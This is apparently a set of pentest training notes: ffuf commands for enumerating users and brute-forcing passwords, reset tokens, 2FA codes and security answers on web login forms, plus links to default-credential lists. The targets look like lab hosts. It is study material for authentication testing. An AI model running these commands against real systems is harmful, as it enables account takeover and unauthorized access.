# Brute-Force Attacks
## Enumerating Users
```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
## Brute-Forcing Passwords
```bash
# Customaizing
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
# Password
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
## Brute-Forcing Password Reset Tokens
```bash
seq -w 0 999999 > tokens.txt

ffuf -w tokens.txt -u http://94.237.122.36:46535/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```
## Brute-Forcing 2FA Codes
```bash
ffuf -w tokens.txt -u http://94.237.48.51:31857/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=rn93ps1erud0phg9fijkr18qgn" -d "otp=FUZZ" -fr "Invalid 2FA Code"
# Common Questions
ffuf -w city_wordlist.txt -u http://83.136.253.5:54291/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=e5dvik7k6cvi932099ue5q4hng" -d "security_response=FUZZ" -fr "Incorrect response."
```

# Default Credentials
- [Default Credentials](https://cirt.net/passwords/)
- [Default Github](https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv)
- [Seclist Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
